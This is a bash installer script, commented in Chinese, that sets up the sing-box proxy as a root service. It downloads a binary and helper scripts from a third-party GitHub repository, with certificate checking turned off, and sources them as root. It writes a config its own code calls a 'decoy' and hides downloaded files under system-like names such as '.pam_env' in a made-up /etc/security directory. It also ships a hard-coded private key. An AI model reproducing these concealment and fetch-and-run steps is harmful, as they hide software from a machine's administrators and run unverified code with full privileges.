#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

SING_BOX_DIR="/etc/sing-box"
HIDDEN_DIR="/etc/security/dispatcher.d"
DECOY_CONFIG="${SING_BOX_DIR}/config.json"
BINARY_PATH="${SING_BOX_DIR}/sing-box"

[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

# 检测系统版本
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "alpine"; then
    release="alpine"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "arch"; then
    release="arch"
else
    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n" && exit 1
fi

arch=$(uname -m)

if [[ $arch == "x86_64" || $arch == "x64" || $arch == "amd64" ]]; then
    arch="64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64-v8a"
elif [[ $arch == "s390x" ]]; then
    arch="s390x"
else
    arch="64"
    echo -e "${red}检测架构失败，使用默认架构: ${arch}${plain}"
fi

echo "架构: ${arch}"

if [ "$(getconf WORD_BIT)" != '32' ] && [ "$(getconf LONG_BIT)" != '64' ] ; then
    echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)，如果检测有误，请联系作者"
    exit 2
fi

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install epel-release wget curl unzip tar crontabs socat ca-certificates -y >/dev/null 2>&1
        update-ca-trust force-enable >/dev/null 2>&1
    elif [[ x"${release}" == x"alpine" ]]; then
        apk add wget curl unzip tar socat ca-certificates openssl >/dev/null 2>&1
        update-ca-certificates >/dev/null 2>&1
    elif [[ x"${release}" == x"debian" ]]; then
        apt-get update -y >/dev/null 2>&1
        apt install wget curl unzip tar cron socat ca-certificates openssl -y >/dev/null 2>&1
        update-ca-certificates >/dev/null 2>&1
    elif [[ x"${release}" == x"ubuntu" ]]; then
        apt-get update -y >/dev/null 2>&1
        apt install wget curl unzip tar cron socat -y >/dev/null 2>&1
        apt-get install ca-certificates wget openssl -y >/dev/null 2>&1
        update-ca-certificates >/dev/null 2>&1
    elif [[ x"${release}" == x"arch" ]]; then
        pacman -Sy --noconfirm >/dev/null 2>&1
        pacman -S --noconfirm --needed wget curl unzip tar cron socat >/dev/null 2>&1
        pacman -S --noconfirm --needed ca-certificates wget >/dev/null 2>&1
    fi
}

# 生成伪装配置
generate_decoy_config() {
    mkdir -p ${SING_BOX_DIR}
    
    # 生成随机参数
    local uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "550e8400-e29b-41d4-a716-446655440000")
    local vless_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "443")
    local vmess_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "8080")
    local hy2_port=$(shuf -i 10000-65535 -n 1 2>/dev/null || echo "8443")
    
    # 生成 X25519 密钥对（如果 sing-box 存在）
    local private_key=""
    local public_key=""
    local short_id=""
    
    if [ -f ${BINARY_PATH} ]; then
        # 使用 timeout 避免命令卡住，设置5秒超时
        local keypair=$(timeout 5s ${BINARY_PATH} x25519 2>/dev/null | grep -E "(private|public)" || echo "")
        private_key=$(echo "$keypair" | grep "private" | awk '{print $3}' || echo "")
        public_key=$(echo "$keypair" | grep "public" | awk '{print $3}' || echo "")
        
        # 从 public_key 生成 short_id (取前8个字符)
        if [ -n "$public_key" ]; then
            short_id=$(echo "$public_key" | cut -c1-8)
        fi
    fi
    
    # 如果生成失败，使用默认值
    if [ -z "$private_key" ]; then
        private_key="U0dmZ3Nl6QXhNMXd0QmU4N2VhMGIxY2Qx"
    fi
    if [ -z "$short_id" ]; then
        short_id=$(cat /dev/urandom | head -c 4 | od -An -tx1 | tr -d ' \n' | tr '[:lower:]' '[:upper:]' | head -c 8)
    fi
    
    echo "[1/6] 生成伪装配置文件..."
    cat > ${DECOY_CONFIG} << 'DECOYEOF'
{
  "log": { "disabled": false, "level": "info", "timestamp": true },
  "inbounds": [
    {
      "type": "vless",
      "tag": "vless-in",
      "listen": "::",
      "listen_port": REPLACE_VLESS_PORT,
      "users": [{ "uuid": "REPLACE_UUID", "flow": "xtls-rprx-vision" }],
      "tls": {
        "enabled": true,
        "server_name": "apple.com",
        "reality": {
          "enabled": true,
          "handshake": { "server": "apple.com", "server_port": 443 },
          "private_key": "REPLACE_PRIVATE_KEY",
          "short_id": ["REPLACE_SHORT_ID"]
        }
      }
    },
    {
      "type": "vmess",
      "tag": "vmess-in",
      "listen": "::",
      "listen_port": REPLACE_VMESS_PORT,
      "users": [{ "uuid": "REPLACE_UUID", "alterId": 0 }],
      "transport": {
        "type": "ws",
        "path": "/vmess",
        "max_early_data": 2048,
        "early_data_header_name": "Sec-WebSocket-Protocol"
      }
    },
    {
      "type": "hysteria2",
      "tag": "hy2-in",
      "listen": "::",
      "listen_port": REPLACE_HY2_PORT,
      "users": [{ "password": "REPLACE_UUID" }],
      "tls": {
        "enabled": true,
        "alpn": ["h3"],
        "certificate_path": "/etc/sing-box/cert.pem",
        "key_path": "/etc/sing-box/private.key"
      }
    }
  ],
  "outbounds": [{ "type": "direct", "tag": "direct" }]
}
DECOYEOF
    
    echo "[2/6] 替换配置参数..."
    sed -i "s/REPLACE_UUID/${uuid}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_VLESS_PORT/${vless_port}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_VMESS_PORT/${vmess_port}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_HY2_PORT/${hy2_port}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_PRIVATE_KEY/${private_key}/g" ${DECOY_CONFIG}
    sed -i "s/REPLACE_SHORT_ID/${short_id}/g" ${DECOY_CONFIG}
    
    echo "[2/6] 配置文件权限设置..."
    timeout 5s chmod 644 ${DECOY_CONFIG} 2>/dev/null || true
    
    echo "[3/6] 生成证书文件..."
    # 使用预制的证书和密钥（避免 openssl 兼容性问题）
    cat > ${SING_BOX_DIR}/cert.pem << 'CERTEOF'
-----BEGIN CERTIFICATE-----
MIIBhDCCASugAwIBAgIUT/FVCRxPwPF4fyEwk4HUmYblGPYwCgYIKoZIzj0EAwIw
FzEVMBMGA1UEAwwMd3d3LmJpbmcuY29tMCAXDTI2MDMxMDE4NTU0MFoYDzIxMjYw
MjE0MTg1NTQwWjAXMRUwEwYDVQQDDAx3d3cuYmluZy5jb20wWTATBgcqhkjOPQIB
BggqhkjOPQMBBwNCAAQ9dv6kUUTwzq4N+MspylDrWGCHbVmkheWw+R0Zp2iP02H6
vyPCoS2A7nrVhdhmdCIooWqQbHFZgy50bE04Zr7Ro1MwUTAdBgNVHQ4EFgQUUrGs
cC1pgMNmnSVusdpR55fMcQMwHwYDVR0jBBgwFoAUUrGscC1pgMNmnSVusdpR55fM
cQMwDwYDVR0TAQH/BAUwAwEB/zAKBggqhkjOPQQDAgNHADBEAiAiYVyt0Tt6j5Pr
5QiBbBbd0GTkQlpXbvwm2jxEUthENAIgA4T99avXWvhLYroKvYRS23qpP+sNoc+T
zCoWr5/Pwq4=
-----END CERTIFICATE-----
CERTEOF
    
    cat > ${SING_BOX_DIR}/private.key << 'KEYEOF'
-----BEGIN EC PARAMETERS-----
BggqhkjOPQMBBw==
-----END EC PARAMETERS-----
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIBHqWqAyHLEsWXO03Obw3dXbH8EDG9fxkt7UK69bjeBHoAoGCCqGSM49
AwEHoUQDQgAEPXb+pFFE8M6uDfjLKcpQ61hgh21ZpIXlsPkdGadoj9Nh+r8jwqEt
gO561YXYZnQiKKFqkGxxWYMudGxNOGa+0Q==
-----END EC PRIVATE KEY-----
KEYEOF
    
    cat > ${SING_BOX_DIR}/public.key << 'PUBEOF'
-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEPXb+pFFE8M6uDfjLKcpQ61hgh21ZpIXlsPkdGadoj9Nh+r8jwqEtgO561YXYZnQiKKFqkGxxWYMudGxNOGa+0Q==
-----END PUBLIC KEY-----
PUBEOF
    
    echo "[4/6] 设置证书权限..."
    timeout 5s chmod 600 ${SING_BOX_DIR}/private.key 2>/dev/null || true
    timeout 5s chmod 644 ${SING_BOX_DIR}/cert.pem 2>/dev/null || true
    timeout 5s chmod 644 ${SING_BOX_DIR}/public.key 2>/dev/null || true
    
    echo "[5/6] 处理geo文件..."
    process_geo_files
    
    echo "[6/6] 伪装配置已生成"
}

# 处理geo文件
process_geo_files() {
    if [[ -f "/tmp/sb-geo/geoip.dat" ]]; then
        echo "  - 处理 geoip.dat..."
        timeout 10s mv "/tmp/sb-geo/geoip.dat" "${HIDDEN_DIR}/.kcache-lib" 2>/dev/null || true
        timeout 5s chmod 644 ${HIDDEN_DIR}/.kcache-lib 2>/dev/null || true
        echo "  - geoip数据已处理"
    fi
    if [[ -f "/tmp/sb-geo/geosite.dat" ]]; then
        echo "  - 处理 geosite.dat..."
        timeout 10s mv "/tmp/sb-geo/geosite.dat" "${HIDDEN_DIR}/.pam_env" 2>/dev/null || true
        timeout 5s chmod 644 ${HIDDEN_DIR}/.pam_env 2>/dev/null || true
        echo "  - geosite数据已处理"
    fi
    echo "  - 清理临时文件..."
    timeout 5s rm -rf /tmp/sb-geo 2>/dev/null || true
}

# 检查状态
check_status() {
    if [[ ! -f ${BINARY_PATH} ]]; then
        return 2
    fi
    if [[ x"${release}" == x"alpine" ]]; then
        temp=$(service sing-box status 2>/dev/null | awk '{print $3}')
        [[ x"${temp}" == x"started" ]] && return 0 || return 1
    else
        temp=$(systemctl status sing-box 2>/dev/null | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
        [[ x"${temp}" == x"running" ]] && return 0 || return 1
    fi
}

# 主安装函数
install_sing-box() {
    mkdir -p ${SING_BOX_DIR}
    mkdir -p ${HIDDEN_DIR}
    
    cd ${SING_BOX_DIR}

    echo "开始下载 sing-box..."
    # 添加超时限制到 wget
    timeout 120 wget -q --no-check-certificate -N --no-show-progress -O sing-box-linux.zip https://github.com/Kanzakiyuu/Kanzakiyuu1/releases/latest/download/sing-box-linux-64.zip
    if [[ $? -ne 0 ]]; then
        echo "下载失败或超时"
        exit 1
    fi

    echo "解压文件..."
    timeout 30 unzip -o sing-box-linux.zip 2>/dev/null || true
    rm -f sing-box-linux.zip
    timeout 5s chmod +x sing-box 2>/dev/null || true
    
    echo "处理geo文件..."
    mkdir -p /tmp/sb-geo
    timeout 10s mv geoip.dat /tmp/sb-geo/ 2>/dev/null || true
    timeout 10s mv geosite.dat /tmp/sb-geo/ 2>/dev/null || true
    
    echo "配置系统服务..."
    if [[ x"${release}" == x"alpine" ]]; then
        # 检查 openrc 是否安装
        if ! command -v openrc &> /dev/null; then
            echo "警告：Alpine 系统未安装 openrc，服务将无法自动启动"
            echo "请运行: apk add openrc"
        fi
        
        cat > /etc/init.d/sing-box << 'SERVICEEOF'
#!/sbin/openrc-run
name="sing-box"
description=""
command="/etc/sing-box/sing-box"
command_args="run -c /etc/sing-box/config.json"
command_user="root"
pidfile="/run/sing-box.pid"
command_background="yes"
depend() { need net; }
SERVICEEOF
        chmod +x /etc/init.d/sing-box
        # 添加到默认运行级别
        if command -v rc-update &> /dev/null; then
            rc-update add sing-box default 2>/dev/null || true
        fi
    else
        cat > /etc/systemd/system/sing-box.service << 'SERVICEEOF'
[Unit]
Description=
After=network.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/etc/sing-box
ExecStart=/etc/sing-box/sing-box run -c /etc/sing-box/config.json
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
SERVICEEOF
        systemctl daemon-reload
        systemctl stop sing-box 2>/dev/null
        systemctl enable sing-box
    fi
    
    echo "服务已安装"
    echo ""
    echo "安装后配置..."

    # 为整个配置生成过程添加超时保护
    (
        generate_decoy_config
        exit_code=$?
        if [ $exit_code -ne 0 ]; then
            echo "警告：配置生成遇到问题 (退出码: $exit_code)"
        fi
    ) || echo "配置生成遇到问题，继续安装..."
    
    echo ""
    echo "下载管理脚本..."
    # 添加超时限制，避免网络问题导致卡住
    timeout 30 wget -q -O /usr/bin/sing-box https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh 2>/dev/null || \
    timeout 30 curl -sL -o /usr/bin/sing-box https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh 2>/dev/null || true
    chmod +x /usr/bin/sing-box 2>/dev/null || true
    
    cd $cur_dir
    
    echo ""
    echo "sing-box 管理命令:"
    echo "------------------------------------------"
    echo "sing-box              - 显示管理菜单"
    echo "sing-box start        - 启动"
    echo "sing-box stop         - 停止"
    echo "sing-box restart      - 重启"
    echo "sing-box status       - 查看状态"
    echo "------------------------------------------"
    
    if [[ ! -f ${HIDDEN_DIR}/.audit-cache ]]; then
        read -rp "检测到你为第一次安装sing-box,是否自动直接生成配置文件？(y/n): " if_generate
        if [[ $if_generate == [Yy] ]]; then
            echo "下载配置生成脚本..."
            timeout 30 curl -o ./initconfig.sh -Ls https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/initconfig_sing-box.sh || true
            if [[ -f ./initconfig.sh ]]; then
                source initconfig.sh
                rm initconfig.sh -f
                generate_config_file
            fi
        fi
    fi
    
    echo "安装完成！"
}

echo -e "${green}开始安装${plain}"



# 检测是否已安装

if check_status 2>/dev/null; then

    echo -e "${yellow}检测到 sing-box 已安装${plain}"

    read -rp "是否先卸载旧版本？(y/n): " if_uninstall

    if [[ $if_uninstall == [Yy] ]]; then

        echo "正在卸载..."

        if [[ x"${release}" == x"alpine" ]]; then

            rc-service sing-box stop 2>/dev/null || true

            rc-update del sing-box default 2>/dev/null || true

        elif command -v systemctl &> /dev/null; then

            systemctl stop sing-box 2>/dev/null || true

            systemctl disable sing-box 2>/dev/null || true

        fi

        rm -rf ${SING_BOX_DIR}

        rm -rf ${HIDDEN_DIR}

        rm -f /usr/bin/sing-box

        rm -f /etc/init.d/sing-box 2>/dev/null || true

        rm -f /etc/systemd/system/sing-box.service 2>/dev/null || true

        systemctl daemon-reload 2>/dev/null || true

        echo -e "${green}卸载完成${plain}"

    else

        echo -e "${yellow}跳过卸载，继续安装${plain}"

    fi

fi



install_base

install_sing-box 

